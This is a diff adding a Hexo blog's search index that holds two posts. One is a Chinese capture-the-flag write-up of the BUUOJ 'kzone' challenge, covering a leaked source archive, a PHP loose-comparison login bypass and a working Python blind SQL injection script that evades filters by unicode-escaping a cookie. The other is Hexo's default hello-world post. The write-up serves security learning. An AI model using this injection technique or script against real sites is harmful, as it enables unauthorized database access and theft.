@@ -1,0 +1,51 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>buuoj_1</title>
+    <url>/2020/02/07/buuoj-1/</url>
+    <content><![CDATA[<p>记录buuoj刷题</p>
+<a id="more"></a>
+
+<h2 id="kzone"><a href="#kzone" class="headerlink" title="kzone"></a>kzone</h2><p>访问链接会跳转到qq空间登录页面，用dirsearch可以爆破到<code>www.zip</code>文件泄露，下载代码进行审计，审计代码大致流程，可以发现included/member.php中存在一处弱类型比较</p>
+<p><img src="/2020/02/07/buuoj-1/image-20200207143054839.png" alt="image-20200207143054839"></p>
+<p>如果想要利用，直接访问/include/member.php是不可以的，必须是从/include/common.php中包含进来，因为要满足</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!defined(<span class="string">'IN_CRONLITE'</span>)) <span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure>
+
+<p>可以看到在/admin/index.php</p>
+<p><img src="/2020/02/07/buuoj-1/image-20200207143458244.png" alt="image-20200207143458244"></p>
+<p>所以可以访问admin/index.php，利用弱类型比较绕过，</p>
+<p><img src="/2020/02/07/buuoj-1/image-20200207143759508.png" alt="image-20200207143759508"></p>
+<p>分析程序逻辑还可以用另一个方法绕过，输入一个不存在的admin_user，那么查询出来的密码就为空，同时LOGINKEY可以在源码中找到，</p>
+<p><img src="/2020/02/07/buuoj-1/image-20200207144337743.png" alt="image-20200207144337743"></p>
+<p>之后找注入点，源码对GET、POST、COOKIE、XFF都进行了过滤，不能注入。但在member.php</p>
+<p><img src="/2020/02/07/buuoj-1/image-20200207144631042.png" alt="image-20200207144631042"></p>
+<p>对cookie先进行过滤再json解码，所以可以通过编码绕过过滤。尝试使用sqlmap编写tamper但是没有成功。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = payload.replace(<span class="string">'u'</span>, <span class="string">'u0075'</span>)</span><br><span class="line">payload = payload.replace(<span class="string">'o'</span>, <span class="string">'u006f'</span>)</span><br><span class="line">payload = payload.replace(<span class="string">'i'</span>, <span class="string">'u0069'</span>)</span><br><span class="line">payload = payload.replace(<span class="string">"'"</span>, <span class="string">'u0027'</span>)</span><br><span class="line">payload = payload.replace(<span class="string">'"'</span>, <span class="string">'u0022'</span>)</span><br><span class="line">payload = payload.replace(<span class="string">' '</span>, <span class="string">'u0020'</span>)</span><br><span class="line">payload = payload.replace(<span class="string">'s'</span>, <span class="string">'u0073'</span>)</span><br><span class="line">payload = payload.replace(<span class="string">'#'</span>, <span class="string">'u0023'</span>)</span><br><span class="line">payload = payload.replace(<span class="string">'&gt;'</span>, <span class="string">'u003e'</span>)</span><br><span class="line">payload = payload.replace(<span class="string">'&lt;'</span>, <span class="string">'u003c'</span>)</span><br><span class="line">payload = payload.replace(<span class="string">'-'</span>, <span class="string">'u002d'</span>)</span><br><span class="line">payload = payload.replace(<span class="string">'='</span>, <span class="string">'u003d'</span>)</span><br></pre></td></tr></table></figure>
+
+<p>编写脚本</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">url&#x3D;&quot;http:&#x2F;&#x2F;fab3873f-f34d-4468-b1d1-df9c59fd565a.node3.buuoj.cn&#x2F;admin&#x2F;&quot;</span><br><span class="line">flag&#x3D;&quot;&quot;</span><br><span class="line">proxies &#x3D; &#123;</span><br><span class="line">  		&quot;http&quot;: &quot;http:&#x2F;&#x2F;127.0.0.1:8080&quot;,</span><br><span class="line">		&#125;</span><br><span class="line">for i in range(1,100):</span><br><span class="line">	high &#x3D; 127</span><br><span class="line">	low &#x3D; 32</span><br><span class="line">	mid &#x3D; (low + high) &#x2F;&#x2F; 2</span><br><span class="line">	while high &gt; low:</span><br><span class="line">		#payload&#x3D;&quot;(asci\\u0069(m\\u0069d((\\u0073elect\\u0020group_concat(column_NAME)\\u0020from\\u0020inf\\u006frmation_schema.columnS\\u0020where\\u0020table_name\\u003d\\u0022fl2222g\\u0022),&#123;&#125;,1))\\u003e&#123;&#125;)&quot;</span><br><span class="line">		payload&#x3D;&quot;(asci\\u0069(m\\u0069d((\\u0073elect\\u0020f44ag\\u0020from\\u0020fl2222g),&#123;&#125;,1))\\u003e&#123;&#125;)&quot;</span><br><span class="line">		data&#x3D;&#39;&#123;&quot;admin_user&quot;:&quot;1\\u0027\\u0020\\u006fr\\u0020&#39;+payload.format(i,mid)+&#39;\\u0023&quot;,&quot;admin_pass&quot;:48&#125;&#39;</span><br><span class="line">		cookie&#x3D;&#123;&quot;islogin&quot;:&#39;1&#39;, &quot;login_data&quot;:data&#125;</span><br><span class="line">		print(cookie)</span><br><span class="line">		r&#x3D;requests.post(url,cookies&#x3D;cookie)#,proxies&#x3D;proxies)</span><br><span class="line">		#print(r.content)</span><br><span class="line">		if b&quot;window.location&quot; not in r.content:</span><br><span class="line">			low&#x3D;mid+1 </span><br><span class="line">		else:</span><br><span class="line">			high&#x3D;mid</span><br><span class="line">		mid&#x3D;(low+high)&#x2F;&#x2F;2</span><br><span class="line">	flag+&#x3D;chr(mid)</span><br><span class="line">	print(flag)</span><br><span class="line">#fish_admin,fish_ip,fish_user,fl2222g </span><br><span class="line">#f44ag</span><br></pre></td></tr></table></figure>
+
+]]></content>
+  </entry>
+  <entry>
+    <title>hello-world</title>
+    <url>/2020/01/25/hello-world/</url>
+    <content><![CDATA[<p>start try</p>
+<a id="more"></a>
+
+<h2 id="正文…"><a href="#正文…" class="headerlink" title="正文…"></a>正文…</h2><h2 id="title-Hello-World"><a href="#title-Hello-World" class="headerlink" title="title: Hello World"></a>title: Hello World</h2><p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>
+]]></content>
+  </entry>
+</search>
